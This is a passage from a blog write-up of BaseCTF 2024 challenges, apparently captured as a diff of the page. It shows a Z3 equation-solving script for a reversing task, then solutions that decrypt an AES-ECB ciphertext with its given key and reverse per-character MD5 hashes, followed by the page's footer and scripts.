* v17+ 489 * v16+ 335 * v15+ 778 * v14+ 622 * v13+ 95 * v12<br>+ 920 * v11+ 932 * v10+ 892 * v9+ 409 * v8+ 392 * v7+ 11 * v6+ 113 * v5+ 948 * v4+ 674 * v3<br>+ 506 * v2+ 182 * v1== 707525)<br>s.add( 479 * v20+ 859 * v19+ 410 * v18+ 399 * v17+ 891 * v16+ 266 * v15+ 773 * v14+ 624 * v13<br>+ 34 * v12+ 479 * v11+ 465 * v10+ 728 * v9+ 447 * v8+ 427 * v7+ 890 * v6+ 570 * v5+ 716 * v4<br>+ 180 * v3+ 571 * v2+ 707 * v1 == 724203)<br>s.add(556 * v20+ 798 * v19+ 380 * v18+ 716 * v17+ 71 * v16+ 901 * v15+ 949 * v14+ 304 * v13<br>+ 142 * v12+ 679 * v11+ 459 * v10+ 814 * v9+ 282 * v8+ 49 * v7+ 873 * v6+ 169 * v5+ 437 * v4<br>+ 199 * v3+ 771 * v2+ 807 * v1== 688899)<br>s.add(465 * v20<br>     + 898 * v19<br>     + 979 * v18<br>     + 198 * v17<br>     + 156 * v16<br>     + 831 * v15<br>     + 856 * v14<br>     + 322 * v13<br>     + 25 * v12<br>     + 35 * v11<br>     + 369 * v10<br>     + 917 * v9<br>     + 522 * v8<br>     + 654 * v7<br>     + 235 * v6<br>     + 385 * v5<br>     + 469 * v4<br>     + 231 * v3<br>     + 496 * v2<br>     + 83 * v1 == 604784)<br>s.add(305 * v20<br>     + 928 * v19<br>     + 260 * v18<br>     + 793 * v17<br>     + 787 * v16<br>     + 708 * v15<br>     + 758 * v14<br>     + 236 * v13<br>     + 688 * v12<br>     + 747 * v11<br>     + 711 * v10<br>     + 195 * v9<br>     + 50 * v8<br>     + 648 * v7<br>     + 787 * v6<br>     + 376 * v5<br>     + 220 * v4<br>     + 33 * v3<br>     + 194 * v2<br>     + 585 * v1 == 665485)<br>s.add(767 * v20<br>     + 573 * v19<br>     + 22 * v18<br>     + 909 * v17<br>     + 598 * v16<br>     + 588 * v15<br>     + 136 * v14<br>     + 848 * v12<br>     + 964 * v11<br>     + 311 * v10<br>     + 701 * v9<br>     + 653 * v8<br>     + 541 * v7<br>     + 443 * v6<br>     + 7 * v5<br>     + 976 * v4<br>     + 803 * v3<br>     + 273 * v2<br>     + 859 * v1 == 727664)<br>s.add(776 * v20<br>     + 59 * v19<br>     + 507 * v18<br>     + 164 * v17<br>     + 397 * v16<br>     + 744 * v15<br>     + 377 * v14<br>     + 768 * v13<br>     + 456 * v12<br>     + 799 * v11<br>     + 9 * v10<br>     + 215 * v9<br>     + 365 * v8<br>     + 181 * v7<br>     + 634 * v6<br>     + 818 * v5<br>     + 81 * v4<br>     + 236 * v3<br>     + 883 * v2<br>     + 95 * v1 == 572015)<br>s.add(873 * v20<br>     + 234 * v19<br>     + 381 * v18<br>     + 423 * v17<br>     + 960 * v16<br>     + 689 * v15<br>     + 617 * v14<br>     + 240 * v13<br>     + 933 * v12<br>     + 300 * v11<br>     + 998 * v10<br>     + 773 * v9<br>     + 484 * v8<br>     + 905 * v7<br>     + 806 * v6<br>     + 792 * v5<br>     + 606 * v4<br>     + 942 * v3<br>     + 422 * v2<br>     + 789 * v1 == 875498)<br>s.add(766 * v20<br>     + 7 * v19<br>     + 283 * v18<br>     + 900 * v17<br>     + 211 * v16<br>     + 305 * v15<br>     + 343 * v14<br>     + 696 * v13<br>     + 590 * v12<br>     + 736 * v11<br>     + 817 * v10<br>     + 603 * v9<br>     + 414 * v8<br>     + 828 * v7<br>     + 114 * v6<br>     + 845 * v5<br>     + 175 * v4<br>     + 212 * v3<br>     + 898 * v2<br>     + 988 * v1 == 714759)<br>s.add(220 * v20<br>     + 30 * v19<br>     + 788 * v18<br>     + 106 * v17<br>     + 574 * v16<br>     + 501 * v15<br>     + 366 * v14<br>     + 952 * v13<br>     + 121 * v12<br>     + 996 * v11<br>     + 735 * v10<br>     + 689 * v9<br>     + 998 * v8<br>     + 689 * v7<br>     + 729 * v6<br>     + 886 * v5<br>     + 860 * v4<br>     + 70 * v3<br>     + 466 * v2<br>     + 961 * v1 == 778853)<br>s.add(313 * v20<br>     + 748 * v19<br>     + 522 * v18<br>     + 864 * v17<br>     + 156 * v16<br>     + 362 * v15<br>     + 283 * v14<br>     + 49 * v13<br>     + 316 * v12<br>     + 79 * v11<br>     + 136 * v10<br>     + 299 * v9<br>     + 271 * v8<br>     + 604 * v7<br>     + 907 * v6<br>     + 540 * v5<br>     + 141 * v4<br>     + 620 * v3<br>     + 701 * v2<br>     + 866 * v1 == 584591)<br>s.add(922 * v20<br>     + 399 * v19<br>     + 425 * v18<br>     + 26 * v17<br>     + 159 * v16<br>     + 224 * v15<br>     + 438 * v14<br>     + 770 * v13<br>     + 144 * v12<br>     + 406 * v11<br>     + 110 * v10<br>     + 991 * v9<br>     + 749 * v8<br>     + 701 * v7<br>     + 646 * v6<br>     + 147 * v5<br>     + 979 * v4<br>     + 674 * v3<br>     + 999 * v2<br>     + 913 * v1 == 717586)<br>s.add(13 * v20<br>     + 537 * v19<br>     + 225 * v18<br>     + 421 * v17<br>     + 153 * v16<br>     + 484 * v15<br>     + 654 * v14<br>     + 743 * v13<br>     + 779 * v12<br>     + 74 * v11<br>     + 325 * v10<br>     + 439 * v9<br>     + 797 * v8<br>     + 41 * v7<br>     + 784 * v6<br>     + 269 * v5<br>     + 454 * v4<br>     + 725 * v2<br>     + 164 * v1 == 537823)<br>s.add(591 * v20<br>     + 210 * v19<br>     + 874 * v18<br>     + 204 * v17<br>     + 485 * v16<br>     + 42 * v15<br>     + 433 * v14<br>     + 176 * v13<br>     + 436 * v12<br>     + 634 * v11<br>     + 82 * v10<br>     + 978 * v9<br>     + 818 * v8<br>     + 683 * v7<br>     + 404 * v6<br>     + 562 * v5<br>     + 41 * v4<br>     + 789 * v3<br>     + 200 * v2<br>     + 220 * v1 == 587367)<br>s.add(584 * v20<br>     + 597 * v19<br>     + 928 * v18<br>     + 532 * v17<br>     + 902 * v16<br>     + 858 * v15<br>     + 820 * v14<br>     + 240 * v13<br>     + 124 * v12<br>     + 899 * v11<br>     + 848 * v10<br>     + 822 * v9<br>     + 409 * v8<br>     + 491 * v7<br>     + 587 * v6<br>     + 715 * v5<br>     + 410 * v4<br>     + 268 * v3<br>     + 721 * v2<br>     + 915 * v1 == 842245)<br>s.add(421 * v20<br>     + 302 * v19<br>     + 327 * v18<br>     + 180 * v17<br>     + 512*v16<br>     + 160 * v15<br>     + 623 * v14<br>     + 28 * v13<br>     + 411 * v12<br>     + 53 * v11<br>     + 633 * v10<br>     + 560 * v9<br>     + 623 * v8<br>     + 477 * v7<br>     + 901 * v6<br>     + 287 * v5<br>     + 149 * v4<br>     + 726 * v3<br>     + 934 * v2<br>     + 875 * v1 == 610801)<br>s.add(838 * v20<br>     + 434 * v19<br>     + 792 * v18<br>     + 649 * v17<br>     + 462 * v16<br>     + 170 * v15<br>     + 980 * v14<br>     + 15 * v13<br>     + 295 * v12<br>     + 495 * v11<br>     + 666 * v10<br>     + 934 * v9<br>     + 17 * v8<br>     + 69 * v7<br>     + 367 * v6<br>     + 780 * v5<br>     + 291 * v4<br>     + 834 * v3<br>     + 587 * v2<br>     + 133 * v1 == 653127)<br>s.add( 41 * v20<br>     + 422 * v19<br>     + 420 * v18<br>     + 224 * v17<br>     + 475 * v16<br>     + 854 * v15<br>     + 233 * v14<br>     + 179 * v13<br>     + 620 * v12<br>     + 69 * v11<br>     + 42 * v10<br>     + 684 * v9<br>     + 300 * v8<br>     + 745 * v7<br>     + 894 * v6<br>     + 554 * v5<br>     + 495 * v4<br>     + 66 * v3<br>     + 316 * v2<br>     + 391 * v1 == 533470)<br><br>flag=[]<br>if s.check() == sat:<br>    ans=s.model()<br>    flag.append(ans[v1])<br>    flag.append(ans[v2])<br>    flag.append(ans[v3])<br>    flag.append(ans[v4])<br>    flag.append(ans[v5])<br>    flag.append(ans[v6])<br>    flag.append(ans[v7])<br>    flag.append(ans[v8])<br>    flag.append(ans[v9])<br>    flag.append(ans[v10])<br>    flag.append(ans[v11])<br>    flag.append(ans[v12])<br>    flag.append(ans[v13])<br>    flag.append(ans[v14])<br>    flag.append(ans[v15])<br>    flag.append(ans[v16])<br>    flag.append(ans[v17])<br>    flag.append(ans[v18])<br>    flag.append(ans[v19])<br>    flag.append(ans[v20])<br><br><br>for x in flag:<br>    print(x,end=&#x27;,&#x27;)<br>flag=[67,68,66,66,68,67,65,65,65,66,66,68,66,67,67,66,67,67,65,67]<br>for i in flag:<br>    print(chr(i),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure>
+
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="helloCrypto"><a href="#helloCrypto" class="headerlink" title="helloCrypto"></a>helloCrypto</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Util.number import *<br>from Crypto.Cipher import AES<br>from Crypto.Util.Padding import pad<br>import random<br><br>flag=b&#x27;BaseCTF&#123;&#125;&#x27;<br><br>key=random.randbytes(16)<br>print(bytes_to_long(key))<br><br>my_aes=AES.new(key=key,mode=AES.MODE_ECB)<br>print(my_aes.encrypt(pad(flag,AES.block_size)))<br><br># key1 = 208797759953288399620324890930572736628<br># c = b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Cipher import AES<br>from Crypto.Util.Padding import unpad<br>from Crypto.Util.number import long_to_bytes<br><br># 示例密钥和密文（来自加密脚本中的注释）<br>key1 = 208797759953288399620324890930572736628<br>c = b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;<br><br># 将密钥从长整数转换为字节串<br>key = long_to_bytes(key1, 16)<br><br># 初始化AES加密器<br>my_aes = AES.new(key=key, mode=AES.MODE_ECB)<br><br># 解密密文<br>decrypted_data = unpad(my_aes.decrypt(c), AES.block_size)<br><br># 输出解密后的数据<br>print(decrypted_data)<br></code></pre></td></tr></table></figure>
+
+<h2 id="你会算md5吗"><a href="#你会算md5吗" class="headerlink" title="你会算md5吗"></a>你会算md5吗</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">import hashlib<br><br>flag=&#x27;BaseCTF&#123;&#125;&#x27;<br><br>output=[]<br>for i in flag:<br>    my_md5=hashlib.md5()<br>    my_md5.update(i.encode())<br>    output.append(my_md5.hexdigest())<br>print(&quot;output =&quot;,output)<br>&#x27;&#x27;&#x27;<br>output = [&#x27;9d5ed678fe57bcca610140957afab571&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;03c7c0ace395d80182db07ae2c30f034&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;0d61f8370cad1d412f80b84d143e1257&#x27;, &#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;, &#x27;800618943025315f869e4e1f09471012&#x27;, &#x27;f95b70fdc3088560732a5ac135644506&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;, &#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;]<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plain">import hashlib<br><br># 输出的MD5哈希列表<br>output = [&#x27;9d5ed678fe57bcca610140957afab571&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;,<br>          &#x27;03c7c0ace395d80182db07ae2c30f034&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;,<br>          &#x27;0d61f8370cad1d412f80b84d143e1257&#x27;, &#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;,<br>          &#x27;800618943025315f869e4e1f09471012&#x27;, &#x27;f95b70fdc3088560732a5ac135644506&#x27;,<br>          &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;,<br>          &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;,<br>          &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;,<br>          &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;,<br>          &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;,<br>          &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;,<br>          &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;,<br>          &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;,<br>          &#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;,<br>          &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;,<br>          &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;,<br>          &#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;,<br>          &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;,<br>          &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;,<br>          &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;,<br>          &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;,<br>          &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;,<br>          &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;,<br>          &#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;]<br><br># 已知的字符MD5映射表（常见的ASCII字符集）<br>md5_map = &#123;&#125;<br>for i in range(128):  # ASCII 字符范围<br>    char = chr(i)<br>    md5_map[hashlib.md5(char.encode()).hexdigest()] = char<br><br># 还原原始 flag<br>recovered_flag = &#x27;&#x27;.join(md5_map[md5] for md5 in output)<br><br>print(&quot;Recovered flag:&quot;, recovered_flag)<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/2024%E6%AF%94%E8%B5%9B/" class="print-no-link">#2024比赛</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BASECTF 2024</div>
+      <div>http://example.com/2025/03/29/BASEctf/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>chaye</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>March 29, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/29/CTFSHOW%E8%8F%9C%E7%8B%97%E6%9D%AF/" title="菜狗杯 2024">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">菜狗杯 2024</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/29/ASM%E9%80%86%E5%90%91/" title="ASM逆向">
+                        <span class="hidden-mobile">ASM逆向</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
